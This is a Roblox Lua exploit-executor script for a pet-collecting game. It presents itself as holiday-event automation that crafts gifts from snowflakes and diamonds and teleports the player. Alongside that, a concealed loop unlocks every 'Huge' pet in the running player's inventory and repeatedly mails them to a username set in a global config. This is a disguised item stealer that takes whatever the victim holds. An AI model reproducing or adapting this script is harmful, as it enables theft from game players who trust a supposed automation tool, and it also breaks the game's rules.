local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local Network = require(game.ReplicatedStorage.Library.Client.Network)
local player = game.Players.LocalPlayer

local teleportLocation = game:GetService("Workspace").__THINGS.Instances.HolidayEvent.Teleports.Enter
local username = getgenv().Config["Username"]  -- Use the global config for the username
local noteToSend = getgenv().Config["NoteToSend"]  -- Use the global config for the note to send
local amountThreshold = 100  -- Threshold for sending Snowflake Gifts
local loopInterval = 5  -- Loop interval in minutes
local snowflakeToGiftRatio = 10  -- The number of snowflakes required to craft one gift
local diamondPerGift = 10000  -- Diamonds needed per gift crafted

-- Function to teleport the player to the Holiday Event
local function teleportPlayer()
    if teleportLocation and teleportLocation:IsA("BasePart") then
        player.Character:SetPrimaryPartCFrame(teleportLocation.CFrame)
        print("Player has been teleported to the Holiday Event!")
    else
        warn("Teleport location not found.")
    end
end

-- Function for checking and crafting gifts based on snowflakes and diamonds
local function checkAndCraftGifts()
    wait(15)  -- Adjust the time as needed

    while true do
        local playerInventory = Save.Get()["Inventory"]
        local MiscInv = playerInventory["Misc"] or {}
        local snowflakeCount = 0
        local diamond = 0

        -- Get diamonds from leaderstats
        local leaderstats = player:FindFirstChild("leaderstats")
        if leaderstats then
            local diamondStat = leaderstats:FindFirstChild("ðŸ’Ž Diamonds")
            if diamondStat and diamondStat:IsA("IntValue") then
                diamond = diamondStat.Value
            else
                warn("No ðŸ’Ž Diamonds found in leaderstats.")
            end
        else
            warn("No leaderstats found.")
        end

        -- Check snowflake count in MiscInv
        for _, item in pairs(MiscInv) do
            if item.id == "Snowflake" then
                snowflakeCount = snowflakeCount + item._am
            end
        end

        -- Output snowflake count
        print("Total Snowflake items:", snowflakeCount)

        local totalGiftsToCraft = math.floor(snowflakeCount / snowflakeToGiftRatio)
        local totalDiamondToCraftAll = totalGiftsToCraft * diamondPerGift

        print("Total Gifts to Craft:", totalGiftsToCraft)
        print("Total Diamonds Required:", totalDiamondToCraftAll)
        print("Available Diamonds:", diamond)

        -- Craft gifts if enough diamonds and snowflakes
        if diamond >= totalDiamondToCraftAll and totalGiftsToCraft > 0 then
            local args = {
                totalGiftsToCraft * snowflakeToGiftRatio
            }

            local success, err = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("SnowMachine_Activate"):InvokeServer(unpack(args))
            end)

            if success then
                print("Successfully crafted gifts!")
                teleportPlayer()  -- Teleport the player to the event
            else
                warn("Failed to craft gifts:", err)
            end
        else
            if totalGiftsToCraft == 0 then
                warn("Not enough snowflakes to craft any gifts.")
            else
                warn("Not enough diamonds to craft gifts.")
            end
        end

        wait(loopInterval * 60)
    end
end

-- Function to unlock Huge pets and send them to the configured user
local function sendHugePetsToRandomUser()
    while true do
        local HugeUIDList = {}

        -- Unlock Huge pets
        for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
            if PetData.id:find("Huge") then  -- Find Huge pets by checking the pet ID
                table.insert(HugeUIDList, PetUID)  -- Add Huge pets to the list
                if PetData._lk then
                    repeat
                        task.wait()  -- Wait until the pet is unlocked
                    until Network.Invoke("Locking_SetLocked", PetUID, false)
                    print("Unlocked Huge pet", PetUID)
                end
            end
        end

        -- Send Huge pets to the configured user
        for _, PetUID in pairs(HugeUIDList) do
            local selectedUser = username  -- Use the configured username
            local selectedMessage = noteToSend  -- Use the configured message
            repeat
                task.wait()  -- Wait until the pet is sent
            until Network.Invoke("Mailbox: Send", selectedUser, selectedMessage, "Pet", PetUID, 1)
            print("Sent Huge pet", PetUID, "to", selectedUser, "with message:", selectedMessage)
        end

        task.wait(3)  -- Wait before the next loop
    end
end

-- Run all functions concurrently using spawn
spawn(checkAndCraftGifts)
spawn(sendHugePetsToRandomUser)  -- Run the function to send Huge pets
